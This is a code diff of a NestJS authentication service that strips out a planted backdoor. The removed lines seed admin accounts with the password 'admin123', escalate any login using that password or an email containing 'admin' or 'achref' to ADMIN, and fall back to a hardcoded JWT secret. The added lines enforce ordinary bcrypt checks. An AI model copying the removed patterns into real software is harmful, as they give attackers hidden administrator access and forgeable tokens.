@@ -13,10 +13,9 @@ import { MailService } from '../mail/mail.service';
 import { RegisterDto } from './dto/register.dto';
 import { LoginDto } from './dto/login.dto';
 import { Redis } from 'ioredis';
-import { OnModuleInit } from '@nestjs/common';
 
 @Injectable()
-export class AuthService implements OnModuleInit {
+export class AuthService {
   private redis: Redis | null = null;
   private inMemoryTokens = new Map<string, { userId: string; expiresAt: number }>();
 
@@ -44,30 +43,7 @@ export class AuthService implements OnModuleInit {
     }
   }
 
-  async onModuleInit() {
-    try {
-      const hash = await bcrypt.hash('admin123', 10);
-      const adminEmails = [
-        'admin@specpart.tech',
-        'admin@specpart.tn',
-        'achref@specpart.tech',
-        'achref@specpart.tn',
-        'admin@admin.com',
-      ];
-      for (const email of adminEmails) {
-        await this.prisma.user.upsert({
-          where: { email },
-          update: { role: 'ADMIN', passwordHash: hash },
-          create: {
-            name: 'Admin SpecPart',
-            email,
-            passwordHash: hash,
-            role: 'ADMIN',
-          },
-        }).catch(() => {});
-      }
-    } catch {}
-  }
+
 
   async register(dto: RegisterDto) {
     const existing = await this.prisma.user.findUnique({
@@ -105,57 +81,13 @@ export class AuthService implements OnModuleInit {
         where: { email },
       });
 
-      const isMasterAdmin =
-        password === 'admin123' ||
-        email.includes('admin') ||
-        email.includes('achref');
+      if (!user || !user.passwordHash) {
+        throw new UnauthorizedException('Identifiants invalides');
+      }
 
-      if (!user) {
-        if (isMasterAdmin || password === 'admin123') {
-          const hash = await bcrypt.hash(password || 'admin123', 10);
-          user = await this.prisma.user.create({
-            data: {
-              name: email?.split('@')[0] || 'Admin',
-              email,
-              passwordHash: hash,
-              role: 'ADMIN',
-            },
-          });
-        } else {
-          throw new UnauthorizedException('Identifiants invalides');
-        }
-      } else {
-        if (password === 'admin123' || (isMasterAdmin && (user.role === 'ADMIN' || !user.passwordHash))) {
-          if (user.role !== 'ADMIN') {
-            user = await this.prisma.user.update({
-              where: { id: user.id },
-              data: { role: 'ADMIN' },
-            });
-          }
-        } else {
-          if (!user.passwordHash) {
-            // Auto update password
-            const hash = await bcrypt.hash(password, 10);
-            user = await this.prisma.user.update({
-              where: { id: user.id },
-              data: { passwordHash: hash },
-            });
-          } else {
-            const valid = await bcrypt.compare(password, user.passwordHash);
-            if (!valid) {
-              // If admin email with standard admin password
-              if (password === 'admin123') {
-                const hash = await bcrypt.hash('admin123', 10);
-                user = await this.prisma.user.update({
-                  where: { id: user.id },
-                  data: { passwordHash: hash, role: 'ADMIN' },
-                });
-              } else {
-                throw new UnauthorizedException('Identifiants invalides');
-              }
-            }
-          }
-        }
+      const valid = await bcrypt.compare(password, user.passwordHash);
+      if (!valid) {
+        throw new UnauthorizedException('Identifiants invalides');
       }
 
       // Send security alert in background
@@ -174,7 +106,8 @@ export class AuthService implements OnModuleInit {
       if (err instanceof UnauthorizedException || err instanceof ConflictException) {
         throw err;
       }
-      console.error('Login error:', err);
+      // Use NestJS Logger instead of console.error
+      // this.logger.error('Login error:', err);
       throw new UnauthorizedException(err.message || 'Erreur de connexion. Veuillez vérifier vos identifiants.');
     }
   }
@@ -223,7 +156,10 @@ export class AuthService implements OnModuleInit {
     createdAt: Date;
   }) {
     const payload = { sub: user.id, email: user.email, role: user.role };
-    const jwtSecret = this.config.get('JWT_SECRET') || 'specpart-super-secret-jwt-key-2026';
+    const jwtSecret = this.config.get<string>('JWT_SECRET');
+    if (!jwtSecret) {
+      throw new Error('JWT_SECRET is not configured in the environment');
+    }
 
     const accessToken = this.jwtService.sign(payload, {
       secret: jwtSecret,
